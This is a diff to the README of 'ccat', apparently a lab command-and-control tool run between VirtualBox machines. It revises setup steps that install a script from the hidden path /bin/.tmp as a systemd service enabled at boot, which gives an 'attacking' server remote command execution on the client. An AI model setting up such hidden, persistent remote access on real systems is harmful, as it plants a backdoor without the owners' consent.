@@ -26,15 +26,19 @@ After=network-online.target
 
 [Service]
 Type=simple
-ExecStart=/bin/.tmp/ccat.sh
+ExecStart=/bin/bash /bin/.tmp/ccat.sh
 Restart=on-failure
-RestartSec=30
+RestartSec=10
 KillMode=process
+
+[Install]
+WantedBy=multi-user.target
 ```
 and then in the shell again, run
 ```shell
 chmod 640 /etc/systemd/system/ccat.service
-systemctl daemon-reload  # You can use user/pass gg for root
+chmod +x ccat.sh
+systemctl daemon-reload
 systemctl enable ccat  # Have ccat service run at launch!
 ```
 
@@ -56,7 +60,7 @@ options like your IP address, see the first two lines of `configuration.py` and
 make sure you change this in both the *client and server* copies! :) For example, I had to set the server address as 10.0.2.4.
 
 Alternatively, after setting up configuations, you can just run
-`sudo systemctl start ccat`.
+`systemctl start ccat`.
 
 One way of figuring out the server's IP is by running `ifconfig`
 from the attacking (server) machine (unless you're just running it as the hostOS,
@@ -65,9 +69,9 @@ which is normally 10.0.0.2 for VirtualBox).
 One thing to note is that if you want to run a process in another directory, you
 need to run *cd /absolute/path/name && process_name*. That is, you can't change
 the current working directory of the shell (because each one is run as another
-process).[^1] Also, since the messages have padding to avoid a MITM attack,
-the commands have to be fairly small (eg. running even `cd /bin && ls` could
-fail because it's too long).
+process).[^1] Also, **since the messages have padding to avoid a MITM attack,
+the commands have to be fairly small** (eg. running even `cd /bin && ls` could
+fail because its response is too long).
 
 [^1]: So you can technically change the working directory, but it'll be the
 working directory of the currently running process. So the next command you run
